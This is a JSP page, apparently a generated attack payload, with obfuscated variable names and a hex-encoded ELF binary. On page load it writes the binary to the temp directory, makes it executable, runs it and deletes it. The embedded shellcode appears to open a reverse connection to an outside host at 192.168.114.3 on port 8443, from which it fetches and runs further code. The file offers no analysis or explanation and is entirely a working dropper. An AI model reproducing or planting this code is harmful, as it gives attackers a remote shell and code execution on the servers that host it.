<%@ page import="java.io.*" %>
<%
  String NnGZbSFx = "7f454c4602010100000000000000000002003e0001000000780040000000000040000000000000000000000000000000000000004000380001000000000000000100000007000000000000000000000000004000000000000000400000000000f9000000000000007a0100000000000000100000000000004831ff6a095899b6104889d64d31c96a22415ab2070f054885c078526a0a415956506a2958996a025f6a015e0f054885c0783b489748b9020020fbc0a87203514889e66a105a6a2a580f05594885c0792549ffc97418576a23586a006a054889e74831f60f0559595f4885c079c76a3c586a015f0f055e5a0f054885c078efffe6";
  String hPZmXPMdQnIv = System.getProperty("java.io.tmpdir") + "/aWlmNIQOvVjy";

  if (System.getProperty("os.name").toLowerCase().indexOf("windows") != -1) {
    hPZmXPMdQnIv = hPZmXPMdQnIv.concat(".exe");
  }

  int sftJklogJWaGB = NnGZbSFx.length();
  byte[] VXzXHGEiQor = new byte[sftJklogJWaGB/2];
  for (int NQtLfaLEfIcC = 0; NQtLfaLEfIcC < sftJklogJWaGB; NQtLfaLEfIcC += 2) {
    VXzXHGEiQor[NQtLfaLEfIcC / 2] = (byte) ((Character.digit(NnGZbSFx.charAt(NQtLfaLEfIcC), 16) << 4)
                                              + Character.digit(NnGZbSFx.charAt(NQtLfaLEfIcC+1), 16));
  }

  FileOutputStream MkrREJuJspZlMJ = new FileOutputStream(hPZmXPMdQnIv);
  MkrREJuJspZlMJ.write(VXzXHGEiQor);
  MkrREJuJspZlMJ.flush();
  MkrREJuJspZlMJ.close();

  if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1){
    String[] VCQxBEUuuTnB = new String[3];
    VCQxBEUuuTnB[0] = "chmod";
    VCQxBEUuuTnB[1] = "+x";
    VCQxBEUuuTnB[2] = hPZmXPMdQnIv;
    Process qyMJiEKCmv = Runtime.getRuntime().exec(VCQxBEUuuTnB);
    if (qyMJiEKCmv.waitFor() == 0) {
      qyMJiEKCmv = Runtime.getRuntime().exec(hPZmXPMdQnIv);
    }

    File SsBMaMWDnqE = new File(hPZmXPMdQnIv); SsBMaMWDnqE.delete();
  } else {
    String[] YodhtfkumxcQoOg = new String[1];
    YodhtfkumxcQoOg[0] = hPZmXPMdQnIv;
    Process qyMJiEKCmv = Runtime.getRuntime().exec(YodhtfkumxcQoOg);
  }
%>
